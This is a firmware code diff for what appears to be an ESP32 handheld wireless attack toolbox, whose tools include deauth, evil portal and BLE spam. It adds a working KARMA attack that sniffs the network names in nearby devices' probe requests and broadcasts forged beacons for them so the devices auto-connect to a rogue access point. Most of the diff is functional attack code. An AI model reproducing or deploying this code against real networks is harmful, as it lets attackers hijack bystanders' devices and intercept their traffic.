@@ -16,7 +16,9 @@
 // ---- Which tool is actively running ----
 enum class ActiveTool : uint8_t {
     NONE = 0, WIFI_SCAN, DEAUTH, BEACON_SPAM, RICKROLL, CLONE_AP, EVIL_PORTAL,
-    PROBE_SNIFF, KARMA, BLE_SCAN, BLE_TRACK, APPLE_SPAM, SAMSUNG_SPAM, SWIFTPAIR_SPAM
+    PROBE_SNIFF, KARMA, DHCP_STARVE,
+    BLE_SCAN, BLE_TRACK, APPLE_SPAM, SAMSUNG_SPAM, SWIFTPAIR_SPAM,
+    FLIPPER_DETECT, SD_BROWSER
 };
 
 // ---- Which context menu type is open ----
@@ -841,6 +843,128 @@ static void drawProbeSniff(TFT_eSPI& t, uint32_t now) {
 }
 
 // =============================================================================
+//  KARMA — respond to probe requests with matching fake APs
+// =============================================================================
+static const int MAX_KARMA_SSIDS = 20;
+static char s_karmaSSIDs[MAX_KARMA_SSIDS][33];
+static int s_karmaCount = 0;
+static uint32_t s_karmaBeacons = 0;
+static bool s_karmaActive = false;
+static uint32_t s_karmaLastBeacon = 0;
+
+static void IRAM_ATTR karmaSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT || !s_karmaActive) return;
+    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    const uint8_t* frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    if (len < 28 || (frame[0] & 0xFC) != 0x40) return;  // not a probe request
+
+    const uint8_t* tags = frame + 24;
+    int tagLen = len - 24;
+    char ssid[33] = {0};
+    for (int i = 0; i < tagLen - 1;) {
+        if (tags[i] == 0 && tags[i+1] > 0 && tags[i+1] <= 32) {
+            memcpy(ssid, tags + i + 2, tags[i+1]);
+            ssid[tags[i+1]] = 0;
+            break;
+        }
+        i += 2 + tags[i+1];
+    }
+    if (ssid[0] == 0) return;
+
+    // Check if already captured
+    for (int i = 0; i < s_karmaCount; i++) {
+        if (strcmp(s_karmaSSIDs[i], ssid) == 0) return;
+    }
+    if (s_karmaCount < MAX_KARMA_SSIDS) {
+        strncpy(s_karmaSSIDs[s_karmaCount], ssid, 32);
+        s_karmaCount++;
+        Serial.printf("[karma] captured SSID: %s\n", ssid);
+    }
+}
+
+static void karmaStart() {
+    s_karmaCount = 0;
+    s_karmaBeacons = 0;
+    s_karmaActive = true;
+    s_karmaLastBeacon = 0;
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.softAP("KarmaAP", NULL, 1, 1);  // hidden AP
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(karmaSniffCb);
+    Serial.println("[toolbox] Karma started");
+}
+
+static void karmaStop() {
+    s_karmaActive = false;
+    esp_wifi_set_promiscuous(false);
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
+}
+
+static void karmaTick() {
+    uint32_t now = millis();
+    if (now - s_karmaLastBeacon < 20 || s_karmaCount == 0) return;
+    s_karmaLastBeacon = now;
+
+    // Broadcast beacons for all captured SSIDs
+    int idx = s_karmaBeacons % s_karmaCount;
+    const char* ssid = s_karmaSSIDs[idx];
+    size_t ssidLen = strlen(ssid);
+
+    beaconFrame[10] = 0xCA; beaconFrame[11] = 0xFE;
+    beaconFrame[12] = 0xBA; beaconFrame[13] = 0xBE;
+    beaconFrame[14] = (uint8_t)idx; beaconFrame[15] = (uint8_t)(idx ^ 0xCC);
+    memcpy(beaconFrame + 16, beaconFrame + 10, 6);
+    beaconFrame[36] = 0x00;
+    beaconFrame[37] = (uint8_t)ssidLen;
+    memcpy(beaconFrame + 38, ssid, ssidLen);
+    size_t ratesOff = 38 + ssidLen;
+    beaconFrame[ratesOff] = 0x01; beaconFrame[ratesOff + 1] = 0x08;
+    uint8_t rates[] = { 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
+    memcpy(beaconFrame + ratesOff + 2, rates, 8);
+    size_t chanOff = ratesOff + 10;
+    beaconFrame[chanOff] = 0x03; beaconFrame[chanOff + 1] = 0x01; beaconFrame[chanOff + 2] = 0x01;
+    esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, chanOff + 3, false);
+    s_karmaBeacons++;
+}
+
+static void drawKarma(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+    karmaTick();
+
+    t.setTextColor(Theme::RED, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("KARMA ATTACK", w / 2, HEADER_H + 20, 4);
+
+    char buf[48];
+    snprintf(buf, sizeof buf, "Captured %d SSIDs  |  %lu beacons",
+             s_karmaCount, (unsigned long)s_karmaBeacons);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString(buf, w / 2, HEADER_H + 50, 2);
+
+    // List captured SSIDs
+    t.setTextDatum(TL_DATUM);
+    int listY = HEADER_H + 75;
+    for (int i = 0; i < min(s_karmaCount, 8); i++) {
+        int drawIdx = i - s_toolScroll;
+        if (drawIdx < 0 || drawIdx >= 8) continue;
+        bool active = ((int)(s_karmaBeacons % s_karmaCount) == i);
+        t.setTextColor(active ? Theme::VAPOR_YELLOW : Theme::CYAN, Theme::BG);
+        t.drawString(s_karmaSSIDs[i], 12, listY + drawIdx * 20, 2);
+    }
+
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("Devices will auto-connect", w / 2, h - 55, 2);
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
 //  BLE SCAN
 // =============================================================================
 static const int MAX_BLE_RESULTS = 40;
@@ -1337,6 +1461,9 @@ static void stopActiveTool() {
             WiFi.softAPdisconnect(true);
             WiFi.mode(WIFI_OFF);
             break;
+        case ActiveTool::KARMA:
+            karmaStop();
+            break;
         case ActiveTool::EVIL_PORTAL:
             evilPortalStop();
             break;
@@ -1376,6 +1503,7 @@ static void launchTool(ActiveTool tool) {
         case ActiveTool::BEACON_SPAM: beaconSpamStart();  break;
         case ActiveTool::RICKROLL:      rickrollStart();    break;
         case ActiveTool::EVIL_PORTAL:   evilPortalStart();  break;
+        case ActiveTool::KARMA:         karmaStart();       break;
         case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
         case ActiveTool::BLE_SCAN:    bleScanStart();     break;
         case ActiveTool::APPLE_SPAM:    appleSpamStart();   break;
@@ -1434,6 +1562,7 @@ static const char* headerForLevel(ToolboxLevel lvl) {
                 case ActiveTool::RICKROLL:    return "RICKROLL";
                 case ActiveTool::CLONE_AP:    return "CLONE AP";
                 case ActiveTool::EVIL_PORTAL: return "EVIL PORTAL";
+                case ActiveTool::KARMA:       return "KARMA";
                 case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                 case ActiveTool::BLE_SCAN:    return "BLE SCAN";
                 case ActiveTool::APPLE_SPAM:    return "APPLE SPAM";
@@ -1687,6 +1816,7 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
             case ActiveTool::RICKROLL:    drawRickroll(t, now);   break;
             case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
             case ActiveTool::EVIL_PORTAL: drawEvilPortal(t, now); break;
+            case ActiveTool::KARMA:       drawKarma(t, now);      break;
             case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
             case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
             case ActiveTool::APPLE_SPAM:    drawAppleSpam(t, now);      break;
@@ -1750,6 +1880,7 @@ static bool handleWifiTap(int idx) {
         case WifiTool::RICKROLL:       launchTool(ActiveTool::RICKROLL); break;
         case WifiTool::EVIL_PORTAL:    launchTool(ActiveTool::EVIL_PORTAL); break;
         case WifiTool::PROBE_SNIFF:    launchTool(ActiveTool::PROBE_SNIFF); break;
+        case WifiTool::KARMA:          launchTool(ActiveTool::KARMA); break;
         default:
             s_toolActive = true;
             s_activeTool = ActiveTool::NONE;
